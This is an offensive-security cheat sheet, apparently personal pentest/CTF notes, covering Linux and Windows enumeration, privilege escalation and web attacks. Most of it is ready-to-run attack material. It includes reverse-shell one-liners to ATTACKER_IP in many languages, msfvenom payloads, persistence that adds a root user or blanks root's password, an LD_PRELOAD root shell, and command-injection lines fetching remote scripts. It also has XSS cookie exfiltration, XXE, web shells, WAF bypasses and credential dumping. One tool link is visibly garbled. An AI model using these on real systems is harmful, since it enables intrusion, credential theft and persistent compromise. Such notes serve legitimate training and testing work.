john hash.txt
```

## Linux Attacks
### Enumeration Linux
**Auto Enumeration Tools**
- [LinPeas](https://github.com/carlospolop/PEASS-ng)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [SUID3NUM](https://github.com/Anon-Exploiter/SUID3NUM)
- [pspy](https://github.com/DominicBreuker/pspy)

**extra tools binary**
- [nmap linux file](https://github.com/andrew-d/static-binaries/bhttps://gist.github.com/ANRCorleone/39322bd9514607b072adaa36d080d96cort=lob/master/binaries/linux/x86_64/nmap?raw=true)

**Manual enumeration**
```bash
# System info
cat /etc/issue
cat /etc/*-release
cat /proc/version
cat /etc/profile
cat ~/.bashrc
env
set

# Processes
ps fauxww

# Cron jobs
cat /etc/crontab
crontab -l
ls -al /etc/cron*
cat /etc/cron*

# SUID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -user root 2>/dev/null
# https://gtfobins.github.io

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Writable files
find / -writable -type d 2>/dev/null
find / -type f -user <USERNAME> -readable 2>/dev/null

# SSH keys
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa
cat /etc/ssh/ssh_config

# Check sudo permissions
sudo -l

# search password inside the file
grep -rnw / -e 'pass*'

# search exploit
searchsploit -m FILE
# update database
searchsploit -u

# Sudo exploitation
sudo su
sudo -u <USERNAME> bash
```

### Privilege Escalation Linux

**Credential Dumping**
```bash
# SHA512 in the standard linux format
hashcat -m 1800 'hash' /usr/share/wordlists/rockyou.txt

# /etc/shadow
unshadow passwd.txt shadow.txt > passwords.txt
john --format=crypt --wordlist=rockyou.txt hash.txt
```
**CVEs**

- Dirty Pipe (CVE-2022-0847)
- CVE-2021-3156 (Sudo)
- CVE-2023-4911 (Looney Tunables)

---
**Interactive shell Linux**
```bash
# qc
/usr/bin/script -qc /bin/bash /dev/null

# python
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'

# xterm
export TERM="xterm"
# Ctrl + Z
stty raw -echo
fg
stty size  
stty -rows 48 -columns 120
stty cols 173 rows 43

# stty
stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /**
```
---
**LD_PRELOAD Exploitation**
LD_PRELOAD is a function that allows any program to use shared libraries
<img src="media/ld-preload.png"
style="" />
Check for LD_PRELOAD (with the env_keep option)
Write a simple C code compiled as a share object (.so extension) file
Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
The C code:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```bash
# Compile
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

# Execute
sudo LD_PRELOAD=/path/to/shell.so <BINARY>
```
---
**Path Exploitation**
```bash
# Check PATH
echo $PATH

# Find writable directories
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u

# Create exploit
gcc path_exp.c -o path -w
chmod u+s path
```

### Persistence
```bash
# Add password to /etc/passwd
echo "hacker:$(openssl passwd -1 -salt THM pass):0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd
su hacker

# delete password root for persistence
sed -i '1s/.*/root::18012:0:99999:7:::/' /etc/shadow
```
---
## Offensive Technique
### buffer overflow
**buffer overflow template**
```python
#!/usr/bin/python
import sys, socket
buffer = "A" * 3000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('<TARGET_IP>', <PORT>))
s.send(('TRUN /.:/' + buffer))
s.recv(1024)
s.close()
```

**Mona Commands (Immunity Debugger)**
!mona modules
!mona find -s "\xff\xe4" -m <MODULE.dll>

**Pattern offset**
msf-pattern_create -l 3000
msf-pattern_offset -q <EIP_VALUE>

### File Transfer
**python server**
```bash 
python3 -m http.server 80
```

**SMB Server**
```bash
impacket-smbserver -smb2support -comment "Share" <SHARE_NAME> /path/to/share
```

### Phishing

- [Evilginx2](https://github.com/kgretzky/evilginx2)
---
### Port Forwarding
**SSH**
```bash
# Local forward
ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> user@<TARGET_IP> -fN

# Remote forward
ssh -R <REMOTE_PORT>:<TARGET_IP>:<TARGET_PORT> user@<ATTACKER_IP> -fN

# Dynamic (SOCKS)
ssh -fND <PORT> user@<TARGET_IP>

# Remote forward
ssh -R 5555:<TARGET_IP>:9999 <USERNAME>@<JUMP_HOST> -p 2222 -v

# Local forward to internal service
ssh -L 8000:127.0.0.1:80 user@<TARGET_IP> -fN

# Dynamic SOCKS proxy
ssh -fND 9997 administrator@<TARGET_IP>
```
---
**Socat**
```bash
# Basic forward
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"

# Port forward
socat TCP-L:<PORT>,fork,reuseaddr TCP:<TARGET_IP>:<TARGET_PORT> &
```
---
**Chisel**
```bash
# Server (attack box)
./chisel server -p <LISTEN_PORT> --reverse &

# Client (target box)
./chisel client <ATTACKER_IP>:<LISTEN_PORT> R:<LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> &

# SOCKS5
./chisel server -p <LISTEN_PORT> --socks5
./chisel client <TARGET_IP>:<LISTEN_PORT> <PROXY_PORT>:socks
```

**Sshuttle**
```bash
sshuttle -r user@<TARGET_IP> --ssh-cmd "ssh -i <KEYFILE>" <NETWORK_RANGE>
```
---
### Reverse Shell
**Autogeneration**

- [Reverse Shell Generator](https://github.com/mthbernardes/rsg)
**Bash**
```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```
**Java**
```bash
msfvenom -p java/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war
msfvenom -p java/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war > shell.war
```
**Linux**
```bash
# Linux reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf -o shell.elf

# With encoding
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 5 -b "\x00\x0a\x0d" -f exe -o shell.exe
```
**Netcat**
```bash
# linux
nc -lvnp <PORT> -e /bin/bash
rlwrap nc -lvnp PORT 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f
# windows
nc -nlvp PORT -e cmd.exe
```

**Perl**
```perl
perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**PHP**
```php
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);popen("/bin/sh -i <&3 >&3 2>&3");'
```
[wwwolf's php web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
[P0wny Shell](https://github.com/flozz/p0wny-shell)
**Python**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Ruby**
```ruby
ruby -rsocket -e'f=TCPSocket.open("<ATTACKER_IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Socat**
```php
php -r '$sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Windows**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > shell.exe
```

**Windows Powershell**
```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER_IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Reconnaissance & Services

### Passive Recon

**theHarvester**
```bash
TODO
```

**Subdomains**
```bash
sublist3r.py -d <DOMAIN>
```

---

### Host Discovery

**Auto Enumeration**

```text
autorecon
threader3000
masscan
```

```bash
# ARP discovery on local network
arp-scan --local

# Layer-2 host discovery on subnet
sudo netdiscover -i eth0 -r <NETWORK_RANGE>

# ICMP sweep
for i in {1..255}; do (ping -c 1 <NETWORK>.${i} | grep "bytes from" &); done
```

**ARP**
```bash
arp-scan --local
```

**DNS server discovery**
```bash
nmap -p 53 <NETWORK_RANGE> -vv -oA dcs
```

---

### Port Scanning

**Netcat**

```bash
nc -nvv -w 1 -z <TARGET_IP> 1-20
```

**Nmap**

```bash
# Fast SYN scan on all ports
sudo nmap -Pn -p- -sS --min-rate 10000 <TARGET_IP>


# Complete scan
nmap -sC -sV -A -Pn -oN scan.txt <TARGET_IP>


# Complete scan all ports
nmap -sC -sV -A -Pn -p- -v -oN scan.txt <TARGET_IP>
```

**Nmap Arguments**

| Argument | Description |
| :-- | :-- |
| `-A` | Aggressive scan, enables OS detection, version detection, default scripts and traceroute |
| `-D DECOY1,DECOY2,ME` | Hide a scan with decoys |
| `-D RND,RND,ME` | Hide a scan with random decoys |
| `-F` | Fast mode, scan top 100 ports |
| `-g PORT_NUM` | Use a specific source port |
| `-iL file.txt` | Read targets from a text file |
| `-n` | Disable DNS resolution |
| `-O` | Enable OS detection |
| `-oN file.txt` | Save output in normal format |
| `-oX file.xml` | Save output in XML format |
| `-p-` | Scan all 65535 ports |
| `-p [range]` | Scan specific ports, for example `-p 80,443` |
| `-Pn` | Skip host discovery, treat host as online |
| `--proxies URL` | Use HTTP/SOCKS4 proxy |
| `--reason` | Show why a port is in a specific state |
| `-S IP_ADDRESS` | Spoof source IP address |
| `-sC` | Run default NSE scripts |
| `-sL` | List scan, no packets sent |
| `-sn` | Ping scan, host discovery only |
| `--script NAME` | Run specific NSE script or category |
| `--source-port PORT_NUM` | Alias for `-g` |
| `--spoof-mac MAC` | Spoof source MAC address |
| `-sS` | TCP SYN scan |
| `-sT` | TCP connect scan |
| `-sU` | UDP scan |
| `-sV` | Service version detection |
| `-T[0-5]` | Timing template, higher is faster |
| `-v` / `-vv` | Increase verbosity level |

**Powershell port scanning**

```powershell
# Single port
Test-NetConnection -ComputerName <TARGET_IP> -Port 5985


# Port scan
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("<TARGET_IP>", $_)) "TCP port $_ is open"} 2>$null
```
**Rustscan**
```bash
rustscan -t 1500 -a <TARGET_IP> --range 1-65000
```
#### UDP

**Discovery / Enumeration**

```bash
sudo nmap -sU -A -p 53,161 <TARGET_IP>
nmap -sC -sV -sU --script=*enum <TARGET_IP>

# Fast UDP
nmap -Pn --top-ports 1000 -sU --stats-every 3m --max-retries 1 -T3 -oN result.txt <TARGET_IP>

sudo nmap -sUV -T4 --version-intensity 0 <TARGET_IP> -v -p 5001-10000 --reason
```

---

### Service Enumeration

#### DNS

**Discovery / Enumeration**

```bash
# Reverse DNS
dig @<DNS_SERVER> -x <TARGET_IP>
dig @<DNS_SERVER> <DOMAIN>


# Zone transfer
host -l <DOMAIN> <DNS_SERVER>
dnsrecon -d <DOMAIN> -t axfr
dig @<DNS_SERVER> AXFR <DOMAIN>


# DNS enumeration
host -t txt <DOMAIN>
dnsrecon -d <DOMAIN> -t std
dnsenum <DOMAIN>
dnsrecon -t brt -d <DOMAIN>


# Reverse lookup loop
for ip in $(seq 1 254); do host <NETWORK>.$ip; done | grep -v "not found"
```

---

#### FTP

**Discovery / Enumeration**

```bash
# Anonymous login
Username: anonymous
Password: anything


# FTP best commands
# disable/enable passive mode
passive
# enable binary mode
binary
# upload a file            
put file.php
# download a file     
get file.php     
```

**FTP-Attack**

```bash
# Bruteforce FTP
sudo hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
```

---

#### HTTP / HTTPS

**Discovery / Enumeration**

```bash
# Check headers
curl -sSkI <URL>

# SSL/TLS check
nmap -Pn -sV --script ssl* -p 443 <TARGET_IP> -A -T5

# Security headers
pipx install shcheck

# Directory fuzzing
dirb <URL>
dirsearch -u <URL>
gobuster dir -u http://<TARGET_IP> -x pdf,txt,php -w <WORDLIST>
gobuster dir -u http://<TARGET_IP> -w <WORDLIST> -t 80
feroxbuster --url http://<TARGET_IP>/ -w <WORDLIST>

# WFuzz
wfuzz -c -w <WORDLIST> --hc 404 --hw 12 <URL>

# FFuf
ffuf -w <WORDLIST> -u http://<TARGET_IP>/FUZZ
ffuf -w <WORDLIST> -H "Host: FUZZ.<DOMAIN>" -u http://<TARGET_IP>

# Content Discovery
cat urls.txt | ./hakrawler
```

**HTTP/HTTPS Bruteforce**

```bash
# Medusa
medusa -h <TARGET_IP> -u <USERNAME> -P <WORDLIST> -M http -m DIR:/


# Hydra GET form
hydra -l admin -P <WORDLIST> <TARGET_IP> http-get-form "/login.php:username=^USER^&password=^PASS^:S=logout.php" -f


# Hydra POST form
hydra -L users.txt -P rockyou.txt <TARGET_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=failed_message"


# HTTP Auth
sudo hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get
```

---

#### NFS

**Discovery / Enumeration**

```bash
# Enumerate NFS
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <TARGET_IP>
showmount -e <TARGET_IP>
```

**NFS Exploitation**

```bash
# Check exports
cat /etc/exports
showmount -e <TARGET_IP>


# Mount with no_root_squash
mount -o rw <TARGET_IP>:/<PATH> /mnt/backdoor
```

```c
int main() {
setgid (0);
setuid (0);
system("/bin/bash");
return 0; }
```

```bash
# Create SUID binary
gcc -static nfs.c -o nfs -w
chmod +s nfs
```

---

#### RDP

**Discovery / Enumeration**

```bash
# RDP info
nmap -sV -p 3389 --script rdp-* <TARGET_IP>
```

**Bruteforce RDP**

- https://github.com/xFreed0m/RDPassSpray
- https://github.com/blacklanternsecurity/TREVORspray
- https://github.com/knavesec/CredMaster

---

#### RPC

**Discovery / Enumeration**

```bash
rpcinfo -p <TARGET_IP>
rpcbind -p <TARGET_IP>
rpcdump.py <TARGET_IP> -p 135 | grep ncacn_np
```

---

#### SMB

**Discovery / Enumeration**

```bash
# Enumeration
nmap --script=smb-enum-shares.nse,smb-enum-users.nse <TARGET_IP>
nmap --script smb-protocols <TARGET_IP>
nmap -v -p 139,445 --script=smb-os-discovery <TARGET_IP>
enum4linux -a <TARGET_IP>


# smbclient
smbclient \\\\<TARGET_IP>\\<SHARE>
smbget -R smb://<TARGET_IP>/anonymous


# Mount SMB
mount -t cifs "//<TARGET_IP>/<SHARE>/" /mnt/smb
```

**SMB-Attack**

```bash
# smbmap
smbmap -H <TARGET_IP>
crackmapexec smb <TARGET_IP> -u '' -p '' --shares
crackmapexec smb <TARGET_IP> -u '<USERNAME>' -p '<PASSWORD>' --shares


# Bruteforce
ncrack -u <USERNAME> -P rockyou.txt -T 5 <TARGET_IP> -p smb -v
```

**Spray passwords SMB**

```bash
crackmapexec smb <NETWORK> -u users.txt -p '<PASSWORD>' -d <DOMAIN> --continue-on-success
.\kerbrute_windows_amd64.exe passwordspray -d <DOMAIN> .\usernames.txt "<PASSWORD>"****
```

**SMB Known Exploits**

- Eternal Blue - CVE-2017-0144
- SambaCry - CVE-2017-7494
- Samba Usermap Script (Version 3.0.20 through 3.0.25rc3)

---

#### SNMP

**Discovery / Enumeration**

```bash
# Nmap SNMP
nmap -sT -p 161 <NETWORK_RANGE> -oG snmp_results.txt


# SNMP Check
snmpcheck -t <TARGET_IP> -c public
snmpenum -t <TARGET_IP>


# SNMP Walk
sudo snmpwalk -c public -v2c <TARGET_IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
sudo snmpwalk -c public -v1 <NETWORK_RANGE>


# Onesixtyone
echo public > community
echo private >> community
echo manager >> community
for ip in \$(seq 1 254); do echo 192.168.50.\$ip; done \> ips
onesixtyone -c community -i ips
```

---

#### SSH

**Discovery / Enumeration**

```bash
# SSH Key permissions
chmod 600 id_rsa
ssh-add id_rsa
```

**SSH Attack**

```bash
# Crack SSH key
python /usr/share/john/ssh2john.py id_rsa > id_rsa.txt
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt


# Bruteforce SSH
sudo hydra -l <USERNAME> -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<TARGET_IP>
```

---

#### WinRM

**Discovery / Enumeration**

```bash
# WinRM on port 5985
# (enumerate con nmap script winrm-*)
nmap -sV -p 5985,5986 --script winrm-* <TARGET_IP>
```

**WinRM Attack**

```bash
# WinRM on port 5985
evil-winrm -u <USERNAME> -p <PASSWORD> -i <TARGET_IP>


# Login with hash
evil-winrm -u Administrator -H <ADMIN_HASH> -i <TARGET_IP>


# Best commands
reg save hklm\system system.bak
reg save hklm\sam sam.bak
download sam.bak
download system.bak
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

## Tools & Automation
### Kali
**Hyper-V RDP Kali**
```bash
# vim /etc/xdrp/xrdp.ini
port=vsock://-1:3389 tcp://:3389
```

**Kali snapshot**

```text
echo "deb http://http.kali.org/kali kali-last-snapshot main contrib non-free non-free-firmware" | sudo tee /etc/apt/sources.list
sudo apt update
sudo apt dist-upgrade
sudo apt autoremove
```

### Metasploit
**basic command**
```bash
# Start listener
use exploit/multi/handler
set payload <PAYLOAD>
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run

# exploit in background
exploit -j

# Sessions
sessions -l
sessions -i <SESSION_ID>

# Database nmap
db_nmap -A <TARGET_IP>

# Vulnerabilities
show auxiliary
check
vulns

```
**Privilege Escalation metasploit**
```bash
getsystem
# load mimikatz
load kiwi
# extract hash (ntlm)
hashdump
```
## Web Vulnerabilities


### Command Injection
```php
# exec command php
\<?php echo shell_exec(\$\_GET\['cmd'\]);?\>
```
``` bash
# Basic
curl -X POST --data 'Archive=git;ipconfig' http://<TARGET_IP>:8000/archive

# Linux reverse shell
curl -X POST --data 'Archive=git;bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"' http://<TARGET_IP>/archive

# Windows reverse shell (PowerShell)
curl -X POST --data 'Archive=git;IEX (New-Object System.Net.Webclient).DownloadString("http://<ATTACKER_IP>/powercat.ps1");powercat -c <ATTACKER_IP> -p 4444 -e powershell' http://<TARGET_IP>:8000/archive
```
### Deserialization
**PHP Deserialization**
Automating scripts during pen-testing is essential for efficiently identifying and exploiting vulnerabilities in web applications. In this task, we will explore one such tool called PHP Gadge Chain (PHPGGC) https://github.com/ambionics/phpggc

**Laravel Deserialization**
php phpggc -l Laravel

### File Upload

**Bypass Extensions:**
- `.phar`
- `.jpg.php`
- `.php5`
- Case variations (`.pHp`, `.PHP`)

**Bypass Magic Numbers:**
- Add file signature at beginning
- Use hexeditor to change characters
- Reference: https://en.wikipedia.org/wiki/List_of_file_signatures

**Exploiting .htaccess**
```apache
AddType application/x-httpd-php .evil
```

**uploads command**
```bash
# Cadaver (WebDAV)
cadaver http://<TARGET_IP>/dav

# Curl PUT
curl -X PUT -d '<?php system($_GET["c"]);?>' http://<TARGET_IP>/shell.php

# Curl POST
curl -X POST -F "file=@/path/to/shell.php" http://<TARGET_IP>/upload.php
```

### LFI
```bash
# Basic LFI
curl "http://<TARGET_IP>/page.php?page=../../../../etc/passwd"
http://TARGET_IP:PORT/profile.php?img=....//....//....//....//....//....//....//....//....//....//etc/passwd

# Null byte (PHP < 5.3.4)
curl "http://<TARGET_IP>/page.php?page=../../../../etc/passwd%00"

# Path traversal encoded
curl "http://<TARGET_IP>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# SSH key
curl "http://<TARGET_IP>/index.php?page=../../../../../../home/<USER>/.ssh/id_rsa"

# Windows
curl --path-as-is "http://<TARGET_IP>/../../Users/<USER>/file.txt"

# Base64 encoded PHP
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://<TARGET_IP>/index.php?page=//text/plain;base64,<BASE64>&cmd=ls"


# example with python
http://IP_TARGET/cmd.php?file=../../../../../var/log/apache2/access.log&cmd=python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

 # example with nc
http://IP_TARGET/cmd.php?file=../../../../../var/log/apache2/access.log&cmd=nc%20-lnvp%20PORT%20-e%20/bin/bash

# wfuzz (verify)
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt --hc 301,404,403 http://IP_ATTACKER:PORT/FUZZ
```

### Object Relational Mapping (ORM) Injection
ORM is a programming technique that facilitates data conversion between incompatible systems using object-oriented programming languages. It allows developers to interact with a database using the programming language's native syntax, making data manipulation more intuitive and reducing the need for extensive SQL queries. ORM is particularly beneficial when complex data interactions are required, as it simplifies database access and promotes code reusability. 
<img src="media/orm.png"
style="" />

**Commonly Used ORM Frameworks**
Several ORM frameworks are widely used in the development community, each catering to different programming languages and environments. Here are a few examples:

**Doctrine (PHP)**
Doctrine is a powerful and flexible ORM framework for PHP. It is particularly popular in the Symfony framework but can be used independently. Doctrine provides a comprehensive set of tools for database interactions, including a query builder, schema management, and an object-oriented query language. Its ability to map complex object structures to database schemas makes it a favourite among PHP developers.

**Hibernate (Java)**
Hibernate is a robust and mature ORM framework for Java applications. It simplifies the mapping of Java classes to database tables and provides powerful data retrieval and manipulation capabilities through its Hibernate Query Language (HQL). Hibernate supports various database management systems and is known for its performance optimisation features, such as caching and lazy loading.

**SQLAlchemy (Python)**
SQLAlchemy is a versatile and powerful ORM for Python. It offers an SQL toolkit and an ORM system that allows developers to use raw SQL when needed while still providing the benefits of an ORM. SQLAlchemy's flexibility and modular architecture make it suitable for a wide range of applications, from small scripts to large-scale enterprise systems.

**Entity Framework (C#)**
Entity Framework is Microsoft's ORM framework for .NET applications. It enables developers to work with relational data using domain-specific objects, eliminating the need for most data-access code that developers typically need to write. Entity Framework supports a variety of database providers and integrates seamlessly with other .NET technologies.

**Active Record (Ruby on Rails)**
Active Record is the default ORM for Ruby on Rails applications. It follows the Active Record design pattern, which means that each table in a database corresponds to a class, and each row in the table corresponds to an instance of that class. Active Record simplifies database interactions by providing a rich set of methods for querying and manipulating data.

**best payload**
```text
1' OR '1'='1
'1'='1'
```

### Prototype Pollution
example crash server
```javascript 
{"__proto__": {"toLocaleString()": "Crash2"}}
```

### Server-Side Request Forgery (SSRF)
example
https://website.thm/item/2?server=server.website.thm/flag?id=9&x=

### Server-Side Template Injection (SSTI)
Server-Side Template Injection (SSTI) is a vulnerability that occurs when user input is unsafely incorporated into a server-side template, allowing attackers to inject and execute arbitrary code on the server.
Template engines are commonly used in web applications to generate dynamic HTML by combining fixed templates with dynamic data. When these engines process user input without proper sanitization, they become susceptible to SSTI attacks.
**Dynamic Content Generation**: Template engines replace placeholders with actual data, allowing applications to generate dynamic HTML pages. This process can be exploited if user inputs are not properly sanitized.
**User Input as Template Code**: When user inputs are treated as part of the template code, they can introduce harmful logic into the rendered output, leading to SSTI. 

Server-Side Template Injection Payloads:
```php
{system("ls")}
{{exec('cat /var/www/html/file.txt')}}
```
```javascript nodejs
#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout}
```
```jinja2 
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}
```

**Automatic SSTI**
git clone https://github.com/vladko312/SSTImap.git

### Waf Evasion

#### SQL Injection WAF Bypass

**No Spaces Bypass**

```bash
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--

# Using comments
?id=1/*comment*/and/**/1=1/**/--

# Using parenthesis
?id=(1)and(1)=(1)--
```

**No Commas Bypass**

```bash
LIMIT 0,1          -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1)  -> SUBSTR('SQL' FROM 1 FOR 1)
SELECT 1,2,3,4     -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

**Generic Bypasses**

```bash
# Case variation
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#

# Operator substitution
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE, REGEXP, RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

**Scientific Notation WAF Bypass**

See [gosecure blog](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) for full explanation.

```bash
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

**Bypass Column Names Restriction**

```bash
# Access column by position — no name needed
SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;

# In SQLi context (3-column table)
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;

# With comma bypass
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```

Reference: [33c3ctf writeup](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

**WAF Tools**

- [Atlas — WAF bypass suggester](https://github.com/m4ll0k/Atlas)

### XXE
<img src="media/image3.png"
style="width:5.99269in;height:4.79167in" />
**Injection IN-BAND XXE**

In-band XXE refers to an XXE vulnerability where the attacker can see the response from the server. This allows for straightforward data exfiltration and exploitation. The attacker can simply send a malicious
XML payload to the application, and the server will respond with the extracted data or the result of the attack. Example:
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<contact>
<name>&xxe;</name>
<email>test@test.com</email>
<message>test</message>
</contact>
```

**Injection Out-of-band XXE**
Out-of-band XXE, on the other hand, refers to an XXE vulnerability wherethe attacker cannot see the response from the server. This requires using alternative channels, such as DNS or HTTP requests, to exfiltrate data. To extract the data, the attacker must craft a malicious XML payload that will trigger an out-of-band request, such as a DNS query or an HTTP request. Example:
```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://<ATTACKER_IP>:1337/" >]>
<upload><file>&xxe;</file></upload>
```
### XSS 

**best payload**
```html
<script>alert('XSS');</script>
"><script>alert('XSS');</script>
</textarea><script>alert('XSS');</script>
';alert('XSS');//
<iframe src="javascript:alert('xss')">
<img src="x" onerror="alert('XSS')">
```

**burp XSS payload**
```javascript
let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://<ATTACKER_IP>/exfil?data=" + encodedCookie)
```
## Windows Attacks

### Enumeration Windows
**Auto Enumeration Tools**

- [WinPeas](https://github.com/carlospolop/PEASS-ng)
- [PrivescCheck](https://github.com/itm4n/PrivescCheck)
- [JAWS](https://github.com/411Hall/JAWS)
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [WES-NG](https://github.com/bitsadmin/wesng)

**Manual**
```powershell
# System info
systeminfo
wmic product get name,version
wmic qfe list

# Users & Groups
whoami /priv
net user
net user /domain
net group /domain
net localgroup administrators
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Name "Remote Management Users"

# Services
net start
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
sc qc <SERVICE_NAME>

# Event logs
Get-EventLog
eventvwr.msc
Event viewer - Script Block Logging  4104

# Scheduled tasks
schtasks /query /fo LIST /v

# Firewall
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off

# Saved credentials
cmdkey /list

# PowerShell history
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# IIS
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString

# Putty
reg query HKEY_CURRENT_USER\Software\USER\PuTTY\Sessions\ /f "Proxy" /s

# Search files
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
findstr /si password *.txt *.ini *.config
dir /s *pass* == *cred* == *vnc* == *.config*

# Installed applications
